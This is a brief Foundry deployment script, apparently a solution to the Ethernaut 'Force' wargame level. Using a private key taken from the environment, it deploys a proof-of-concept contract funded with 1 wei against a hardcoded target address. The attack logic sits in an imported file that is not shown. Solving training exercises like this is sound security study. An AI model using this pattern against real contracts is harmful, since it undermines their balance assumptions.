// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "Ethernaut/force.sol";

contract ForcePOCScript is Script {
    function run() public {
        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);
        new ForcePOC{value: 1}(0x60eA8acA8375Ea2064883b964a9575e1843C3BA0);
        vm.stopBroadcast();
    }
}